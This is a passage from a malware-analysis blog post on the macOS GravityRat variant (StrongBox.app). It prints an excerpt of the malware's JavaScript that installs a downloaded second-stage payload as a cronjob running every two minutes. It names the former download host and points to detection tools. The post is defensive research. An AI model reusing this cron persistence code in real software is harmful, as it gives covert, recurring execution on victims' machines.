<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-JavaScript" data-lang="JavaScript"><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1</span><span><span style="color:#66d9ef">function</span> <span style="color:#a6e22e">scheduleMac</span>(<span style="color:#a6e22e">fname</span>,<span style="color:#a6e22e">agentTask</span>)
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 2</span><span>{
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 3</span><span>  ...                                                         
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 4</span><span>  <span style="color:#66d9ef">var</span> <span style="color:#a6e22e">poshellMac</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">loclpth</span><span style="color:#f92672">+</span><span style="color:#e6db74">&#34;/&#34;</span><span style="color:#f92672">+</span><span style="color:#a6e22e">fname</span>;
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 5</span><span>  <span style="color:#a6e22e">execTask</span>(<span style="color:#e6db74">&#39;chmod -R 0700 &#39;</span>  <span style="color:#f92672">+</span> <span style="color:#e6db74">&#34;\&#34;&#34;</span> <span style="color:#f92672">+</span>  <span style="color:#f92672">+</span> <span style="color:#e6db74">&#34;\&#34;&#34;</span>  );                                                
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 6</span><span>  
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 7</span><span>  ...
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 8</span><span>  <span style="color:#a6e22e">arg</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">agentTask</span>;
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 9</span><span>  <span style="color:#a6e22e">execTask</span>(<span style="color:#e6db74">&#39;crontab -l 2&gt;/dev/null; 
</span></span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">10</span><span><span style="color:#e6db74">            echo \&#39; */2 * * * * &#39;</span> <span style="color:#f92672">+</span> <span style="color:#e6db74">&#34;\&#34;&#34;</span> <span style="color:#f92672">+</span><span style="color:#a6e22e">poshellMac</span> <span style="color:#f92672">+</span> <span style="color:#e6db74">&#34;\&#34; &#34;</span> <span style="color:#f92672">+</span> <span style="color:#a6e22e">arg</span> <span style="color:#f92672">+</span> <span style="color:#e6db74">&#39;\&#39; 
</span></span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">11</span><span><span style="color:#e6db74">            | crontab -&#39;</span>, <span style="color:#a6e22e">puts22</span>);
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">12</span><span>    
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">13</span><span>}</span></span></code></pre></div>
<p>&hellip;the persisted payload, will be (re)launched every two minutes (<code>*/2 * * * * </code>).</p>
<p>Unfortunately as the remote server (<code>download.strongbox.in</code>) is now offline, this 2<sup>nd</sup> stage payload is not available for analysis.</p>
<h3 id="conclusions">Conclusions</h3>
<p>In this blog post, we wrapped up our analysis of the macOS variant of <code>GravityRat</code>.
Specifically we deconstructed the Electron versions (focusing on <code>StrongBox.app</code>), and highlighted their role as downloaders of 2<sup>nd</sup>-stage payload(s) &hellip;payloads persisted as cronjobs.</p>
<p>And although we do not have access to such payload(s), <a href="https://objective-see.com/products/blockblock.html">BlockBlock</a> will readily detect their (cronjob) persistence at runtime:</p>
<img src="../images/blog/blog_0x5C/blockblock.png"  width="100%" class="center" style="border-radius: 4px;">

<center style="color:#787878; padding-top:5px;">BlockBlock ...block, blocking!</center>

<p>&hellip;while <a href="https://objective-see.com/products/knockknock.html">KnockKnock</a> can reveal any existing infections:</p>
<img src="../images/blog/blog_0x5C/knockknock.png"  width="100%" class="center" style="border-radius: 4px;">

<center style="color:#787878; padding-top:5px;">KnockKnock ...who&#39;s there?</center>

<br>
<div class="note">
From a terminal, one can use the crontab command (with the -l parameter) to enumerate any cronjobs ...including those related to GravitRat's persistence. 
</div>
<br>
<h3 id="-the-art-of-mac-malware">ðŸ“š The Art of Mac Malware</h3>
<p>If this blog posts pique your interest, definitely check out my new book on the topic of Mac Malware Analysis: &ldquo;<a href="https://taomm.org">The Art Of Mac Malware: Analysis</a>&rdquo;. It&rsquo;s free online, and new content is regularly added!</p>
<h3 id="-support-us">ðŸ’• Support Us:</h3>
<div style="border: 1px solid #DCDCDC; border-radius:7px; padding: 10px; margin-top:15px; margin-bottom: 15px;">
    <center>Love these blog posts? You can support them via my <a href="https://www.patreon.com/bePatron?c=701171" class="inlineLink">Patreon</a> page!
    <br><br>
    <a href="https://www.patreon.com/bePatron?c=701171" style="text-decoration: none;">
      <img src="../images/patreon.png" style="display:block;margin:auto; padding-top:0px; width:100%"/>
    </a>
    </center>
</div>
</section>

    </div>

    
<script src="/js/cookies.js"></script>
<script src="/social/ss-social.js"></script>
<link href="/social/ss-social.css" rel="stylesheet" />

<script> 
    $(function(){
        
        
        
        if("" == getCookie("acceptedCookies")) 
        {
            console.log('ok showing!')

            document.getElementById("cookies").style.display = "block";
        }

    });
</script>

<script>
function acceptCookies() {

    
    setCookie("acceptedCookies", "yes", 365);

    
    document.getElementById("cookies").style.display = "none";
}
</script>

<br>
<br>
<div id="cookies" class="cookie" style="padding-left:20px;">
    This website uses cookies to improve your experience.
    <div class="cookieButton">
        
        <button class="menuicon button-4" role="button" onclick="acceptCookies()" style="margin-top: 12px; float: right; padding:3px; padding-left: 10px; padding-right: 10px;">Okay!</button>
    </div>
</div>
<nav role="footer">
<ul>

    <li>
        <a href="mailto:contact@objective-see.com" class="menubutton icon"><span class="ss-icon" style="overflow-y: hidden;">&#x2709;</span></a>
    </li>

     <li>
        <a href="rss.xml" class="menubutton icon"><span class="ss-icon" style="overflow-y: hidden;">&#xE310;</span></a>
    </li>

    <li>
        <a href="https://www.youtube.com/channel/UCQycc8VDhHuNkZlKSSTDHzw" class="menubutton icon"><span class="ss-icon" style="overflow-y: hidden;">&#xF630;</span></a>
    </li>
   
    <li>
        <a href="https://twitter.com/objective_see" class="menubutton icon"><span class="ss-icon">&#xF611;</span></a>
    </li>
    
    <li>
         <form action="support.html" style="display: inline;">
            <button class="menuicon button-4" role="button" style="margin-top: 7px; float: right; padding:3px; padding-left: 10px; padding-right: 10px;">Support Us!</button>
        </form>
        
    </li>

    <li>
        <div style="margin-top: 10px;">
        Signup for our <a class="inlineLink" target="_blank" href="http://eepurl.com/bXpXeT">newsletter </a> Â»
        </div>
    </li>

</ul>
</nav>

  </body>
</html>